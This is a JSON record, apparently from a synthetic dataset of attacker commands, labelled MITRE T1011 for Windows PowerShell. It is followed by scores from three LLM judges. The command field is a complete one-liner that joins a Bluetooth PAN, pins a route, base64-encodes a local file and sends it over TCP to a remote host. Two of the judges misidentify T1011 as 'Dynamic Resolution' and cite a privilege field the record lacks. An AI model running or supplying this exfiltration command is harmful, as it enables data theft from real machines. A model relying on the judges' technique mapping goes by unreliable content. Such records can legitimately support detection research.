{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name=\"$($ad.Name)\" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()",
  "explanation": "Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).",
  "rationale_steps": [
    "Connect Bluetooth NAP to use a different medium.",
    "Set a static address on the Bluetooth adapter using netsh.",
    "Add a host route bound to the Bluetooth interface index to force path selection.",
    "Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1f794ee5",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax throughout, and appropriate variable usage.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements exfiltration over Bluetooth PAN by establishing a connection, configuring IP addressing, creating a route, and sending base64-encoded data over TCP, though it's unclear if the specific Bluetooth connection approach is fully realistic.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T07:57:32.776715Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct Powershell syntax, balanced quotes/parentheses, valid command flags, and proper use of command separators.",
        "semantic_score": 1,
        "semantic_justification": "The command is misaligned with T1011 'Dynamic Resolution' as all network endpoints are statically defined, and the execution relies on Administrator privileges, contradicting the stated 'Privilege: None' required for crucial `netsh` and `route` commands.",
        "combined_score": 3.0,
        "confidence": 1.0,
        "timestamp": "2025-10-02T07:57:47.493382Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell pipeline is well-formed with balanced quotes/parentheses, valid separators, and correct variable expansions.",
        "semantic_score": 1,
        "semantic_justification": "The command does not implement dynamic resolution (no DGA/DNS/endpoint rotation) and also relies on admin-requiring netsh/route and an uncertain BluetoothCL /connect NAP usage, making it misaligned with the stated technique and unlikely to achieve the claimed intent.",
        "combined_score": 3.0,
        "confidence": 0.7,
        "timestamp": "2025-10-02T07:58:11.565240Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}